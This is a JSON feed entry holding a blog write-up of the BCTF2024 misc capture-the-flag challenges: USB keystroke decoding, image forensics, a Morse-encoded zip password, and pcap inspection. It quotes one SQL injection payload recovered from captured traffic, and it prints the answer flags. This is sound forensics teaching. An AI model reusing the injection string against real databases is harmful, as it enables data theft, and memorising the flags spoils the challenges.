            "url": "https://blog.twelveeee.top/2024/CTF/BCTF2024/misc/",
            "title": "BCTF2024-MISC",
            "date_published": "2024-10-12T07:00:00.000Z",
            "content_html": "<h1 id=\"bctf2024-misc\"><a class=\"anchor\" href=\"#bctf2024-misc\">#</a> BCTF2024-MISC</h1>\n<h2 id=\"ezkeyboard\"><a class=\"anchor\" href=\"#ezkeyboard\">#</a> ezkeyboard</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>如题</p>\n<p><code>https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2024/a.pcap</code></p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{1a2a3a4a5a6a7a8a9aaabacadaeafa0a}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<p>使用 wireshark 打开</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span> /Applications/Wireshark.app/Contents/MacOS/tshark</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">ln</span> <span class=\"token parameter variable\">-s</span> /Applications/Wireshark.app/Contents/MacOS/tshark /usr/local/bin/tshark</pre></td></tr></table></figure><p>提取出 usbhid.data</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>tshark <span class=\"token parameter variable\">-r</span> a.pcap <span class=\"token parameter variable\">-T</span> fields <span class=\"token parameter variable\">-e</span> usb.capdata <span class=\"token operator\">></span> result.txt</pre></td></tr></table></figure><figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>keycode_map <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token number\">0x04</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x05</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'b'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x06</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'c'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'d'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'e'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token number\">0x09</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'f'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0A</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'g'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0B</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'h'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0C</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'i'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0D</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'j'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token number\">0x0E</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'k'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0F</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'l'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'m'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x11</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'n'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x12</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'o'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token number\">0x13</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'p'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x14</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'q'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x15</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x16</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'s'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x17</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'t'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token number\">0x18</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'u'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x19</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'v'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1A</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'w'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1B</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'x'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1C</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token number\">0x1D</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'z'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1E</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1F</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'2'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'3'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x21</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'4'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token number\">0x22</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'5'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'6'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'7'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x25</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'8'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x26</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'9'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token number\">0x27</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'0'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Enter'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x29</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Esc'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2A</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Backspace'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2B</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Tab'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token number\">0x2C</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Space'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2D</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'-'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2E</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'='</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2F</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'['</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">:</span> <span class=\"token string\">']'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token number\">0x31</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'\\\\'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'#'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x33</span><span class=\"token punctuation\">:</span> <span class=\"token string\">';'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x34</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'\\''</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x35</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'`'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token number\">0x36</span><span class=\"token punctuation\">:</span> <span class=\"token string\">','</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x37</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'.'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x39</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'CapsLock'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>shifted_keycode_map <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token number\">0x04</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'A'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x05</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'B'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x06</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'C'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'D'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'E'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token number\">0x09</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'F'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0A</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'G'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0B</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'H'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0C</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0D</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'J'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token number\">0x0E</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'K'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0F</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'L'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'M'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x11</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'N'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x12</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'O'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token number\">0x13</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'P'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x14</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Q'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x15</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'R'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x16</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'S'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x17</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'T'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token number\">0x18</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'U'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x19</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'V'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1A</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'W'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1B</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'X'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1C</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Y'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token number\">0x1D</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Z'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1E</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'!'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1F</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'@'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'#'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x21</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'$'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token number\">0x22</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'%'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'^'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'&amp;'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x25</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x26</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'('</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token number\">0x27</span><span class=\"token punctuation\">:</span> <span class=\"token string\">')'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2D</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'_'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2E</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'+'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2F</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'&#123;'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'&#125;'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token number\">0x31</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'|'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'~'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x33</span><span class=\"token punctuation\">:</span> <span class=\"token string\">':'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x34</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'\"'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x35</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'~'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token number\">0x36</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'&lt;'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x37</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'>'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'?'</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">parse_hid_report</span><span class=\"token punctuation\">(</span>report<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token comment\"># 拆分报告为字节</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    bytes_data <span class=\"token operator\">=</span> report<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token comment\"># 解析修饰键</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    modifier <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>bytes_data<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token comment\"># 解析按键代码</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    key_codes <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> byte <span class=\"token keyword\">in</span> bytes_data<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token comment\"># 检查是否按下 Shift 键</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    shift_pressed <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>modifier <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token keyword\">or</span> <span class=\"token punctuation\">(</span>modifier <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token comment\"># 映射按键代码到字符</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    keys <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">for</span> code <span class=\"token keyword\">in</span> key_codes<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">if</span> code <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">if</span> shift_pressed<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            keys<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>shifted_keycode_map<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>            keys<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>keycode_map<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>keys<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>keys<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\t:\"</span><span class=\"token operator\">+</span> report<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>keys<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token comment\"># 示例数据</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>reports <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token string\">\"01:00:00:09:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token comment\"># ... 太长了不写</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token keyword\">for</span> report <span class=\"token keyword\">in</span> reports<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    parse_hid_report<span class=\"token punctuation\">(</span>report<span class=\"token punctuation\">)</span></pre></td></tr></table></figure></div></details>\n<h2 id=\"太感人了\"><a class=\"anchor\" href=\"#太感人了\">#</a> 太感人了</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>太感人了</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2024/mm.png\" alt=\"图片\" /></p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{7c3e0313aa944890177797bfbfa4d189}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>brew <span class=\"token function\">install</span> pngcheck</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>pngcheck <span class=\"token parameter variable\">-v</span> mm.png</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>strings mm.png</pre></td></tr></table></figure></div></details>\n<h2 id=\"密码压缩包\"><a class=\"anchor\" href=\"#密码压缩包\">#</a> 密码压缩包</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>密码压缩包</p>\n<p><code>https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2024/flag2.zip</code></p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{dab06be7a415c57b3199686e4949505a}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>读取二进制文件</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\"><span class=\"token variable\">`</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>./.----/<span class=\"token punctuation\">..</span>-./.-<span class=\"token punctuation\">..</span>/.-/--./--/<span class=\"token punctuation\">..</span>/--/.-<span class=\"token variable\">`</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>51FLAGMIMA</pre></td></tr></table></figure></div></details>\n<h2 id=\"ftp协议不安全\"><a class=\"anchor\" href=\"#ftp协议不安全\">#</a> ftp 协议不安全</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>来看看 FTP 的协议</p>\n<p><code>https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2024/ftp.pcapng</code></p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{1qazxsw2098}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<p>wireShark 打开 pcapng<br />\ncommand+f flag{</p>\n</div></details>\n<h2 id=\"黑客拿走了什么\"><a class=\"anchor\" href=\"#黑客拿走了什么\">#</a> 黑客拿走了什么</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>服务被 SQL 注入攻击了，黑客拿走了什么</p>\n<p><code>https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2024/sqlinject.pcapng</code></p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{2508944f919f9608df64353f28dcb7a0}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<pre><code>qxbpqflag&#123;2508944f919f9608df64353f28dcb7a0&#125;qkvqq&lt;/br&gt;&lt;/br&gt;select id from record where id=2 UNION ALL SELECT CONCAT(0x7178627071,IFNULL(CAST(domain AS CHAR),0x20),0x716b767171) FROM record WHERE domain like 0x25666c616725-- -\n</code></pre>\n</div></details>\n<h2 id=\"这图片很可疑\"><a class=\"anchor\" href=\"#这图片很可疑\">#</a> 这图片很可疑</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>这图片很可疑</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2VsdmVlZWUtbm90ZS5vc3MtY24tYmVpamluZy5hbGl5dW5jcy5jb20vZmlsZS9iY3RmMjAyNC8yLmpmaWY=\">https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2024/2.jfif</span></p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{6c4e0311aa944890177717bfbfa4d189}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<pre><code>brew install binwalk\n\nbinwalk 2.jfif\n\n\n</code></pre>\n</div></details>\n<h2 id=\"ezlsb\"><a class=\"anchor\" href=\"#ezlsb\">#</a> ezlsb</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>ezlsb</p>\n<p><code>https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2024/lsb.zip</code></p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{74b2ecfa346acfcde3741da73cd4c55d}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<p>用 stegsolve 打开</p>\n<p>extract by column<br />\nbit order lsb<br />\nbit plan 都是 0</p>\n<p>mac 有 bug，看不到剩下的</p>\n</div></details>\n",
            "tags": [
                "计算机科学",
                "CTF",
                "BCTF2024",
                "CTF"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2024/Project/hexo-github-action-deploy/",
            "url": "https://blog.twelveeee.top/2024/Project/hexo-github-action-deploy/",
            "title": "Hexo 使用github Action 进行发布",
            "date_published": "2024-10-01T13:00:00.000Z",
